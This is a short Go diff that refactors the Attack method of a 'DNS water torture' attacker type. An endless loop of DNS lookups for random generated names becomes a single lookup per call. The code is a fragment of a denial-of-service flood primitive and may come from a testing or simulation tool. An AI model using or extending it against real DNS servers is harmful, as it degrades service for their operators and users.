@@ -44,14 +44,8 @@ func (a *DnsWaterTortureAttacker) makePayload(length int) string {
 	return string(buf)
 }
 
-func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) error {
-	for {
-		select {
-		case <-ctx.Done():
-		default:
-			length := 10 + rand.Intn(40)
-			payload := a.makePayload(length)
-			a.resolver.LookupHost(ctx, payload)
-		}
-	}
+func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) {
+	length := 10 + rand.Intn(40)
+	payload := a.makePayload(length)
+	a.resolver.LookupHost(ctx, payload)
 }
